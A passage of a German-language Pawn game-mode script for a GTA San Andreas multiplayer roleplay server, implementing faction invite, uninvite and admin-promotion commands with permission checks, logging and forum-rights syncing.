						SetPlayerInterior(playa, intid);
						PlayerInfo[playa][pInt] = intid;
						format(string, sizeof(string), " Du hast %s den interior auf %d gesetzt.", giveplayer, intid);
						SendClientMessage(playerid, COLOR_GRAD1, string);
						format(string, sizeof(string), " %s hat deinen Interior auf %d gesetzt.", sendername, intid);
						SendClientMessage(playa, COLOR_GRAD1, string);
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt diesen Befehl zu nutzen!");
			}
		}
		return 1;
	}
/*
	if(strcmp(cmd, "/invite", true) == 0)
	{
		tmp = strtoknew(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /invite [playerid/Name]");
			return 1;
		}
		new leader = PlayerInfo[playerid][pLeader];
		new para1 = ReturnUser(tmp);

        if(PlayerInfo[playerid][pLeader] > 0)
		{
		    if(IsPlayerConnected(para1))
		    {
		        if(para1 != INVALID_PLAYER_ID)
		        {
				    if (gTeam[para1]==TEAM_GREEN && PlayerInfo[para1][pMember] == 0 && PlayerInfo[para1][pFMember] == 255)
				    {
						if(PlayerInfo[para1][pFrakSperre] == 0)
						{
						    if(GetDistanceBetweenPlayers(playerid,para1) <= 8)
							{
								printf("AdmCmd: %s hat %s in die Fraktion %s eingeladen.", sendername, giveplayer,Fracs[leader-1]);
								GetPlayerName(para1, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
								format(string, sizeof(string), "   Du wurdest in die Fraktion %s von Leader %s eingeladen.",Fracs[leader-1], sendername);
								SendClientMessage(para1, COLOR_LIGHTBLUE, string);
	                            new dialogText[128];
	                            format(dialogText,sizeof(dialogText),"%s von der Fraktion %s Möchte dich als Member aufnehmen",sendername,Fracs[leader-1]);
	                            ShowPlayerDialog(para1, DIALOG_INVITE,DIALOG_STYLE_MSGBOX,"Einladung",dialogText,"Annehmen","Ablehnen");
								format(string, sizeof(string), "   Du hast %s in die Fraktion %s eingeladen.", giveplayer,Fracs[leader-1]);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								SendClientMessage(playerid, COLOR_GRAD2, " Der Spieler muss nun deine Einladung annehmen oder ablehnen.");
								new iyear, imonth,iday;
								getdate(iyear, imonth, iday);
								format(string, sizeof(string), "%s[Level:%d] wurde von %s in die Fraktion %s eingeladen (%d-%d-%d)", giveplayer,PlayerInfo[para1][pLevel],sendername,Fracs[leader-1],imonth,iday,iyear);
								MemberLog(string);
								Eingeladen[para1] = leader;

							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "  Der Spieler ist nicht in deiner Nähe!");
							    return 1;
							}
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "  Dieser Spieler hat eine Fraktions-Sperre");
						    return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "  Dieser Spieler ist in einer anderen Fraktion oder bereits ein Fraktionsmitglied.");
					    return 1;
					}
				}
			}//not connected
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Leader!");
		}
		return 1;
	}
*/
	if(strcmp(cmd,"/einladung",true) == 0)
	{
		tmp = strtoknew(cmdtext,idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "BENUTZUNG: /einladung [annehmen/ablehnen]");
			return 1;
		}
		if(Eingeladen[playerid] == 0)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Du wurdest in keine Fraktion eingeladen!");
			return 1;
		}
		if(strcmp(tmp,"annehmen",true) == 0)
		{
		    if(Eingeladen[playerid] == 1) { PlayerInfo[playerid][pTeam] = 2; gTeam[playerid] = 2; ChosenSkin[playerid] = 280; SetPlayerSkin(playerid, 280); }
		    else if(Eingeladen[playerid] == 2) { PlayerInfo[playerid][pTeam] = 2; gTeam[playerid] = 2; ChosenSkin[playerid] = 280; SetPlayerSkin(playerid, 280); }
		    else if(Eingeladen[playerid] == 3) { PlayerInfo[playerid][pTeam] = 2; gTeam[playerid] = 2; ChosenSkin[playerid] = 287; SetPlayerSkin(playerid, 287); }
		    else if(Eingeladen[playerid] == 4) { PlayerInfo[playerid][pTeam] = 1; gTeam[playerid] = 1; ChosenSkin[playerid] = 70; SetPlayerSkin(playerid, 70); }
		    else if(Eingeladen[playerid] == 5) { PlayerInfo[playerid][pTeam] = 5; gTeam[playerid] = 5; ChosenSkin[playerid] = 258; SetPlayerSkin(playerid, 120); }
		    else if(Eingeladen[playerid] == 6) { PlayerInfo[playerid][pTeam] = 5; gTeam[playerid] = 5; ChosenSkin[playerid] = 294; SetPlayerSkin(playerid, 294); }
		    else if(Eingeladen[playerid] == 7) { PlayerInfo[playerid][pTeam] = 7; gTeam[playerid] = 7; ChosenSkin[playerid] = 164; SetPlayerSkin(playerid, 164); }
		    else if(Eingeladen[playerid] == 8) { PlayerInfo[playerid][pTeam] = 8; gTeam[playerid] = 8; ChosenSkin[playerid] = 250; SetPlayerSkin(playerid, 250); }
		    else if(Eingeladen[playerid] == 9) { PlayerInfo[playerid][pTeam] = 9; gTeam[playerid] = 9; ChosenSkin[playerid] = 187; SetPlayerSkin(playerid, 187); }
		    else if(Eingeladen[playerid] == 10) { PlayerInfo[playerid][pTeam] = 10; gTeam[playerid] = 10; ChosenSkin[playerid] = 255; SetPlayerSkin(playerid, 255); }
		    else if(Eingeladen[playerid] == 11) { PlayerInfo[playerid][pTeam] = 11; gTeam[playerid] = 11; ChosenSkin[playerid] = 240; SetPlayerSkin(playerid, 240); }
		    else if(Eingeladen[playerid] == 12) { PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; ChosenSkin[playerid] = 118; SetPlayerSkin(playerid, 118); }//Triaden
		    else if(Eingeladen[playerid] == 13) { PlayerInfo[playerid][pTeam] = 13; gTeam[playerid] = 13; ChosenSkin[playerid] = 105; SetPlayerSkin(playerid, 105); }//Grove
		    else if(Eingeladen[playerid] == 14) { PlayerInfo[playerid][pTeam] = 14; gTeam[playerid] = 14; ChosenSkin[playerid] = 102; SetPlayerSkin(playerid, 102); }//Ballas
		    else if(Eingeladen[playerid] == 15) { PlayerInfo[playerid][pTeam] = 15; gTeam[playerid] = 15; ChosenSkin[playerid] = 185; SetPlayerSkin(playerid, 185); }//Feuerwehr
		    else if(Eingeladen[playerid] == 16) { PlayerInfo[playerid][pTeam] = 16; gTeam[playerid] = 16; ChosenSkin[playerid] = 108; SetPlayerSkin(playerid, 108); }//Los Santos Vagos
		    else if(Eingeladen[playerid] == 17) { PlayerInfo[playerid][pTeam] = 17; gTeam[playerid] = 17; ChosenSkin[playerid] = 114; SetPlayerSkin(playerid, 114); }//Varios Los Aztecas
		    else if(Eingeladen[playerid] == 18) { PlayerInfo[playerid][pTeam] = 18; gTeam[playerid] = 18; ChosenSkin[playerid] = 173; SetPlayerSkin(playerid, 173); }//Los Santos Rifa
		    else if(Eingeladen[playerid] == 19) { PlayerInfo[playerid][pTeam] = 19; gTeam[playerid] = 19; ChosenSkin[playerid] = 234; SetPlayerSkin(playerid, 234); }//West Coust Customs
		    else if(Eingeladen[playerid] == 20) { PlayerInfo[playerid][pTeam] = 20; gTeam[playerid] = 20; ChosenSkin[playerid] = 220; SetPlayerSkin(playerid, 220); }
		    else if(Eingeladen[playerid] == 21) { PlayerInfo[playerid][pTeam] = 21; gTeam[playerid] = 21; ChosenSkin[playerid] = 28; SetPlayerSkin(playerid, 28); }             else if(Eingeladen[playerid] == 22) { PlayerInfo[playerid][pTeam] = 22; gTeam[playerid] = 22; ChosenSkin[playerid] = 274; SetPlayerSkin(playerid, 274); }
		    else if(Eingeladen[playerid] == 23) { PlayerInfo[playerid][pTeam] = 23; gTeam[playerid] = 23; ChosenSkin[playerid] = 133; SetPlayerSkin(playerid, 133); }
			else if(Eingeladen[playerid] == 24) { PlayerInfo[playerid][pTeam] = 24; gTeam[playerid] = 24; ChosenSkin[playerid] = 255; SetPlayerSkin(playerid, 255); }
			else { return 1; }
			GetPlayerName(playerid,sendername,sizeof(sendername));
			PlayerInfo[playerid][pMember] = Eingeladen[playerid];
			PlayerInfo[playerid][sMember] = Eingeladen[playerid];
			PlayerInfo[playerid][pRank] = 1;
//        	GivePlayerForumRechte(playerid);

			GivePlayerForumRights(playerid,Eingeladen[playerid],0);


			format(string,sizeof(string)," %s hat die Einladung in die Fraktion %s angenommen!",sendername,Fracs[Eingeladen[playerid]-1]);
			for(new i=0; i<MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
				    if(PlayerInfo[i][pLeader] == Eingeladen[playerid])
				    {
				        SendClientMessage(i,COLOR_LIGHTBLUE,string);
				    }
				}
			}
			SetPlayerInterior(playerid,0);

            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		    SetPlayerFacingAngle(playerid, 88.4779);

			FreezePlayer(playerid);
		    SelectChar[playerid] = 255;
		    Eingeladen[playerid] = 0;
		    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
		    SelectCharPlace[playerid] = 1;
		    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
			PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			SendClientMessage(playerid, COLOR_GRAD5, " Du kannst mit /help deine neuen Fraktionsbefehle betrachten");
			SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
			SetPlayerVirtualWorld(playerid, 3);
		}
		else if(strcmp(tmp,"ablehnen",true) == 0)
		{
			format(string,sizeof(string)," %s hat die Einladung in die Fraktion %s abgelehnt!",sendername,Fracs[Eingeladen[playerid]-1]);
			for(new i=0; i<MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
				    if(PlayerInfo[i][pLeader] == Eingeladen[playerid])
				    {
				        SendClientMessage(i,COLOR_LIGHTBLUE,string);
				    }
				}
			}
			Eingeladen[playerid] = 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /einladung [annehmen/ablehnen]");
		}
	    return 1;
	}
//----------------------------------[UNINVITE]------------------------------------------------
	if(strcmp(cmd, "/uninvite", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "BENUTZUNG: /uninvite [Spieler ID / Name]");
				return 1;
			}
			new para1;
			para1 = ReturnUser(tmp);
			if (PlayerInfo[playerid][pLeader] >= 1)
			{
			    if(IsPlayerConnected(para1))
			    {
			        if(para1 != INVALID_PLAYER_ID)
			        {
					    if (PlayerInfo[para1][pMember] > 0 && PlayerInfo[para1][pMember] == PlayerInfo[playerid][pLeader])
					    {
							GetPlayerName(para1, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							printf("AdmCmd: %s hat %s rausgeschmissen.", sendername, giveplayer);
							format(string, sizeof(string), "* Du wurdest aus deiner Fraktion %s vom Leader %s gekickt.",Fracs[PlayerInfo[para1][pMember]-1],sendername);
							SendClientMessage(para1, COLOR_LIGHTBLUE, string);
							SendClientMessage(para1, COLOR_LIGHTBLUE, "* Du bist nun wieder ein Zivilist.");
							SendClientMessage(para1, COLOR_LIGHTBLUE, "* Dein Gehalt wurde wieder auf 0$ gesetzt.");
							PlayerInfo[para1][pGehalt] = 0;
			                gTeam[para1] = 3;
							PlayerInfo[para1][pTeam] = 3;
							PlayerInfo[para1][pLeader] = 0;
							PlayerInfo[para1][sMember] = 0;
							PlayerInfo[para1][pMember] = 0;
							PlayerInfo[para1][pRank] = 0;
							PlayerInfo[para1][pChar] = 2;
		                    SkinStatus[para1] = para1;
		                    SetPlayerPos(para1, 1497.9749,-1664.6473,34.0469);
					        SetPlayerCameraPos(para1, 1492.5426,-1664.8420,36.3946);
					        SetPlayerCameraLookAt(para1, 1494.4083,-1664.8248,35.7894);
				        	SetPlayerFacingAngle(para1, 88.4779);
						    FreezePlayer(para1);
			        	    SetPlayerInterior(para1, 0);
						    SendClientMessage(para1, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
		 				    SendClientMessage(para1, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(para1, 3);
							format(string, sizeof(string), "   Du hast %s aus der Fraktion gekickt.", giveplayer);
							GivePlayerForumRights(para1,0,0);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
//							GivePlayerForumRechte(para1);
						}
						else
						{
							SendClientMessage(playerid, COLOR_GRAD1, "  Du kannst nur die Member deiner Fraktion uninviten!");
						}
					}
				}//not connected
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Nur der Leader kann diesen Befehl nutzen!");
			}
		}
		return 1;
	}
//----------------------------------[AINVITE]------------------------------------------------
	if(strcmp(cmd, "/ainvite", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /ainvite [Spieler ID / Name] [FraktionsNummer]");
				SendClientMessage(playerid, COLOR_YELLOW, "Fraktionen: 1 LSPD, 2 FBI, 3 Bundeswehr 4 Sanitäter, 5 LCM, 6 Yakuza, 7 Präsi, 8 Hitman");
				SendClientMessage(playerid, COLOR_YELLOW, "Fraktionen: 9 San News, 12 Triaden, 13 Gs, 14 Ballas, 16 Vagos, 17 Aztecas, 18 SF Rifa");
				SendClientMessage(playerid, COLOR_YELLOW, "Fraktionen: 19 RS, 20 Terror 21 Wheelmen Agency, 22 S.W.A.T 23 Russen Mafia 24 O-Amt");
				return 1;
			}
			new para1, fraktion, ftext[20];
			para1 = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /ainvite [Spieler ID / Name] [FraktionsNummer]");
				SendClientMessage(playerid, COLOR_YELLOW, "Fraktionen: 1 LSPD, 2 FBI, 3 Bundeswehr 4 Sanitäter, 5 LCM, 6 Yakuza, 7 Präsi, 8 Hitman");
				SendClientMessage(playerid, COLOR_YELLOW, "Fraktionen: 9 San News, 12 Triaden, 13 Gs, 14 Ballas, 16 Vagos, 17 Aztecas, 18 SF Rifa");
				SendClientMessage(playerid, COLOR_YELLOW, "Fraktionen: 19 RS, 20 Terror 21 Wheelmen Agency, 22 S.W.A.T 23 Russen Mafia 24 O-Amt");
				return 1;
			}
			fraktion = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
			    if(IsPlayerConnected(para1))
			    {
			        if(para1 != INVALID_PLAYER_ID)
			        {
					    if (PlayerInfo[para1][sMember] == 0 && PlayerInfo[para1][pLeader] == 0)
					    {
					        if(fraktion == 1) { PlayerInfo[para1][pTeam] = 2; gTeam[para1] = 2; ftext = "LSPD"; ChosenSkin[para1] = 280; SetPlayerSkin(para1, 280); }
					        else if(fraktion == 2) { PlayerInfo[para1][pTeam] = 2; gTeam[para1] = 2; ftext = "FBI"; ChosenSkin[para1] = 286; SetPlayerSkin(para1, 280); }
					        else if(fraktion == 3) { PlayerInfo[para1][pTeam] = 2; gTeam[para1] = 2; ftext = "Bundeswehr"; ChosenSkin[para1] = 287; SetPlayerSkin(para1, 287); }
					        else if(fraktion == 4) { PlayerInfo[para1][pTeam] = 1; gTeam[para1] = 1; ftext = "Sanitäter"; ChosenSkin[para1] = 70; SetPlayerSkin(para1, 70); }
					        else if(fraktion == 5) { PlayerInfo[para1][pTeam] = 5; gTeam[para1] = 5; ftext = "La Cosa Nostra"; ChosenSkin[para1] = 258; SetPlayerSkin(para1, 120); }
					        else if(fraktion == 6) { PlayerInfo[para1][pTeam] = 5; gTeam[para1] = 5; ftext = "Yakuza"; ChosenSkin[para1] = 294; SetPlayerSkin(para1, 294); }
					        else if(fraktion == 7) { PlayerInfo[para1][pTeam] = 7; gTeam[para1] = 7; ftext = "Regierung"; ChosenSkin[para1] = 164; SetPlayerSkin(para1, 164); }
					        else if(fraktion == 8) { PlayerInfo[para1][pTeam] = 8; gTeam[para1] = 8; ftext = "Hitman Agency"; ChosenSkin[para1] = 250; SetPlayerSkin(para1, 250); }
					        else if(fraktion == 9) { PlayerInfo[para1][pTeam] = 9; gTeam[para1] = 9; ftext = "San News"; ChosenSkin[para1] = 188; SetPlayerSkin(para1, 188); }
					        else if(fraktion == 10) { PlayerInfo[para1][pTeam] = 10; gTeam[para1] = 10; ftext = "Transport GmbH"; ChosenSkin[para1] = 255; SetPlayerSkin(para1, 255); }
					        else if(fraktion == 11) { PlayerInfo[para1][pTeam] = 11; gTeam[para1] = 11; ftext = "Fahrschule"; ChosenSkin[para1] = 240; SetPlayerSkin(para1, 240); }
					        else if(fraktion == 12) { PlayerInfo[para1][pTeam] = 12; gTeam[para1] = 12; ftext = "Triaden"; ChosenSkin[para1] = 118; SetPlayerSkin(para1, 118); }//Triaden
					        else if(fraktion == 13) { PlayerInfo[para1][pTeam] = 13; gTeam[para1] = 13; ftext = "Grove Street Family"; ChosenSkin[para1] = 105; SetPlayerSkin(para1, 105); }//Grove Street
					        else if(fraktion == 14) { PlayerInfo[para1][pTeam] = 14; gTeam[para1] = 14; ftext = "Ballas"; ChosenSkin[para1] = 102; SetPlayerSkin(para1, 102); }//Ballas
                            else if(fraktion == 15) { PlayerInfo[para1][pTeam] = 15; gTeam[para1] = 15; ftext = "Feuerwehr"; ChosenSkin[para1] = 185; SetPlayerSkin(para1, 185); }//Feuerwehr
                            else if(fraktion == 16) { PlayerInfo[para1][pTeam] = 16; gTeam[para1] = 16; ftext = "L.S.Vagos"; ChosenSkin[para1] = 108; SetPlayerSkin(para1, 108); }//Los Santos Vagos
					        else if(fraktion == 17) { PlayerInfo[para1][pTeam] = 17; gTeam[para1] = 17; ftext = "V.L.Aztecas"; ChosenSkin[para1] = 114; SetPlayerSkin(para1, 114); }//Varios Los Aztecas
					        else if(fraktion == 18) { PlayerInfo[para1][pTeam] = 18; gTeam[para1] = 18; ftext = "L.S.Rifa"; ChosenSkin[para1] = 173; SetPlayerSkin(para1, 173); }//Los Santos Rifa
					        else if(fraktion == 19) { PlayerInfo[para1][pTeam] = 19; gTeam[para1] = 19; ftext = "Red Soldiers"; ChosenSkin[para1] = 66; SetPlayerSkin(para1, 66); }//West Coust Customs
					        else if(fraktion == 20) { PlayerInfo[para1][pTeam] = 20; gTeam[para1] = 20; ftext = "Terror"; ChosenSkin[para1] = 220; SetPlayerSkin(para1, 220); }
					        else if(fraktion == 21) { PlayerInfo[para1][pTeam] = 21; gTeam[para1] = 21; ftext = "Wheelmen Agency"; ChosenSkin[para1] = 28; SetPlayerSkin(para1, 28); }
					        else if(fraktion == 22) { PlayerInfo[para1][pTeam] = 22; gTeam[para1] = 22; ftext = "S.W.A.T"; ChosenSkin[para1] = 283; SetPlayerSkin(para1, 283); }
					        else if(fraktion == 23) { PlayerInfo[para1][pTeam] = 23; gTeam[para1] = 23; ftext = "Russen Mafia"; ChosenSkin[para1] = 133; SetPlayerSkin(para1, 133); }
							else if(fraktion == 24) { PlayerInfo[para1][pTeam] = 24; gTeam[para1] = 24; ftext = "Ordnungsamt"; ChosenSkin[para1] = 255; SetPlayerSkin(para1, 255); }
							else
							{
								SendClientMessage(playerid, COLOR_GRAD2, " Fraktionsnummer ungültig! 1-24");
								return 1;
							}
							GetPlayerName(para1, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							PlayerInfo[para1][sMember] = fraktion;
							PlayerInfo[para1][pMember] = fraktion;
							PlayerInfo[para1][pRank] = 1;
							printf("AdmCmd: %s hat %s in die Fraktion %s eingeladen.", sendername, giveplayer, ftext);
							format(string, sizeof(string), " Du wurdest in die Fraktion %s von Admin %s eingeladen.", ftext, sendername);
							SendClientMessage(para1, COLOR_LIGHTBLUE, string);
							SendClientMessage(para1, COLOR_GRAD5, " Du kannst mit /help deine neuen Fraktionsbefehle betrachten");
							format(string, sizeof(string), "   Du hast %s in die Fraktion %s eingeladen.", giveplayer,ftext);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							SetPlayerInterior(para1,0);
                            SetPlayerPos(para1, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(para1, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(para1, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(para1, 88.4779);
							FreezePlayer(para1);
						    SelectChar[para1] = 255;
						    SelectCharID[para1] = PlayerInfo[para1][pMember];
						    SelectCharPlace[para1] = 1;
						    PlayerInfo[para1][pModel] = ChosenSkin[para1];
					    	PlayerInfo[para1][pChar] = ChosenSkin[para1];
			                SendClientMessage(para1, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(para1, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(para1, 3);
//							GivePlayerForumRechte(para1);
					 		GivePlayerForumRights(para1,fraktion,PlayerInfo[para1][sMember]);
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "  Dieser Spieler hat zur Zeit ein Wanted / ist in einer anderen Fraktion / oder bereits ein Fraktionsmitglied.");
						    return 1;
						}
					}
				}//not connected
			}//not admin
		}
		return 1;
	}
//----------------------------------[AUNINVITE]------------------------------------------------
	if(strcmp(cmd, "/auninvite", true) == 0)
	{
	    if(IsPlayerConnected(playerid) && PlayerInfo[playerid][pAdmin] >= 3)
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "BENUTZUNG: /auninvite [playerid/Name]");
				return 1;
			}
			new para1;
			para1 = ReturnUser(tmp);
		    if(IsPlayerConnected(para1) && para1 != INVALID_PLAYER_ID)
		    {
			    if (PlayerInfo[para1][pMember] > 0)
			    {
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					printf("AdmCmd: %s has uninvited %s.", sendername, giveplayer);
					format(string, sizeof(string), "* Du wurdest aus deiner Fraktion von Admin %s gekickt.", sendername);
					SendClientMessage(para1, COLOR_LIGHTBLUE, string);
					SendClientMessage(para1, COLOR_LIGHTBLUE, "* Du bist nun wieder ein Zivilist.");
                    SkinStatus[para1] = para1;
                    SetPlayerPos(para1, 1497.9749,-1664.6473,34.0469);
			        SetPlayerCameraPos(para1, 1492.5426,-1664.8420,36.3946);
			        SetPlayerCameraLookAt(para1, 1494.4083,-1664.8248,35.7894);
		        	SetPlayerFacingAngle(para1, 88.4779);
				    FreezePlayer(para1);
	        	    SetPlayerInterior(para1, 0);
				    SendClientMessage(para1, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
				    SendClientMessage(para1, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
			        SetPlayerVirtualWorld(para1, 3);
					PlayerInfo[para1][pLeader] = 0;
					gTeam[para1] = 3;
					PlayerInfo[para1][pTeam] = 3;
					PlayerInfo[para1][pMember] = 0;
					PlayerInfo[para1][sMember] = 0;
					PlayerInfo[para1][pRank] = 0;
					PlayerInfo[para1][pGehalt] = 0;
					new rand = random(sizeof(CIV));
					SetSpawnInfo(para1, gTeam[para1], CIV[rand],0.0,0.0,0.0,0,0,0,0,0,0,0);
					PlayerInfo[para1][pModel] = CIV[rand];
					MedicBill[para1] = 0;
					format(string, sizeof(string), "Du hast %s aus seiner Fraktion gekickt.", giveplayer);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					GivePlayerForumRights(para1,0,0);
//					GivePlayerForumRechte(para1);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist in keiner Fraktion!");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist nicht verfügbar!");
			}
		}
		return 1;
	}
//----------------------------------[MAKEADMIN]------------------------------------------------

	if(strcmp(cmd, "/makeadmin", true) == 0)
	{
	    if(IsPlayerAdmin(playerid))
	    {

			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /makeadmin [ID] [Level]");
				return 1;
			}
			new para1 = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			new level = strval(tmp);
		    if(IsPlayerConnected(para1))
		    {
		        if(para1 != INVALID_PLAYER_ID)
		        {
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					if(PlayerInfo[para1][pAdmin] < level)
					{
						printf("AdmCmd: %s hat %s zu einem Level %d Admin befördert.", sendername, giveplayer, level);
						format(string, sizeof(string), "%s hat %s zu einen %d Admin befördert", sendername,giveplayer, level);
						WBB_AddPostUserID(1, 21, "Makeadmin-Log", string, 1, 0, 1, 1, 0, 0, playerid, 1);
						AdminLog(string);
						format(string, sizeof(string), "Du wurdest durch %s zu einem Level %d Admin befördert", sendername, level);
						SendClientMessage(para1, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "Du hast %s zu einem Level %d Admin befördert.", giveplayer,level);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					else
					{
						printf("AdmCmd: %s hat %s zu einem Level %d Admin degradiert.", sendername, giveplayer, level);
						format(string, sizeof(string), "%s hat %s zu einen %d Admin degradiert", sendername,giveplayer, level);
						WBB_AddPostUserID(1, 21, "Makeadmin-Log", string, 1, 0, 1, 1, 0, 0, playerid, 1);
						AdminLog(string);
						format(string, sizeof(string), "Du wurdest durch %s zu einem Level %d Admin degradiert", sendername, level);
						SendClientMessage(para1, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "Du hast %s zu einem Level %d Admin degradiert.", giveplayer,level);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					SaveMysqlPlayer(para1);
					GivePlayerForumRightsAdmin(para1,level,PlayerInfo[para1][pAdmin]);
					if(PlayerInfo[para1][pAdmin] == 0)
					{
					    if(level > 1)
				 	    {
							new stringfick[128];
							new randpasswort = 1000 + random(8999);//minimum 1000  max 9999 //giving one at the start
							PlayerInfo[para1][pAdminPasswort] = randpasswort;
							SendClientMessage(para1, COLOR_LIGHTBLUE, ".:: Information ::.");
            				format(stringfick, sizeof(stringfick), "Dein Admin PIN wurde erstellt! Sie lautet: %d Bitte schreibe es dir auf", randpasswort);
							SendClientMessage(para1, COLOR_LIGHTBLUE, stringfick);
							SendClientMessage(para1, COLOR_LIGHTBLUE, "Tipp! Schreibe es auf einen Zettel.");
						}
					}
					PlayerInfo[para1][pAdmin] = level;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Du bist nicht im RCON Angemeldet!");
		}
		return 1;
	}

//----------------------------------[MAKEIRCADMIN]----------------------------------------------
    if(strcmp(cmd, "/makeircadmin", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /makeircadmin [playerid] [ChannelNr]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "NUTZUNG: /makeircadmin [playerid] [ChannelNr]");
				return 1;
			}
			new channel = strval(tmp);
			if(channel > 10 || channel < 0) { SendClientMessage(playerid, COLOR_GREY, "   Nicht weniger als 0, oder mehr als 10!"); return 1; }
			if (PlayerInfo[playerid][pAdmin] >= 1337)
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
			        if(giveplayerid != INVALID_PLAYER_ID)
			        {
						GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, sizeof(string), "* Du hast %s zum IRC Admin über Channel %d gemacht.", giveplayer, channel);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* %s hat dich zum IRC Admin über channel %d gemacht.", sendername, channel);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s", giveplayer);
						switch(channel)
						{
						    case 1:
						    {
						        strmid(IRCInfo[0][iAdmin], string, 0, strlen(string), 255);
						        IRCInfo[0][iNeedPass] = 0; IRCInfo[0][iLock] = 0;
						    }
						    case 2:
						    {
						        strmid(IRCInfo[1][iAdmin], string, 0, strlen(string), 255);
						        IRCInfo[1][iNeedPass] = 0; IRCInfo[1][iLock] = 0;
						    }
						    case 3:
						    {
						        strmid(IRCInfo[2][iAdmin], string, 0, strlen(string), 255);
						        IRCInfo[2][iNeedPass] = 0; IRCInfo[2][iLock] = 0;
						    }
						    case 4:
						    {
						        strmid(IRCInfo[3][iAdmin], string, 0, strlen(string), 255);
						        IRCInfo[3][iNeedPass] = 0; IRCInfo[3][iLock] = 0;
						    }
						    case 5:
						    {
						        strmid(IRCInfo[4][iAdmin], string, 0, strlen(string), 255);
						        IRCInfo[4][iNeedPass] = 0; IRCInfo[4][iLock] = 0;
						    }
						    case 6:
						    {
						        strmid(IRCInfo[5][iAdmin], string, 0, strlen(string), 255);
						        IRCInfo[5][iNeedPass] = 0; IRCInfo[5][iLock] = 0;
						    }
						    case 7:
						    {
						        strmid(IRCInfo[6][iAdmin], string, 0, strlen(string), 255);
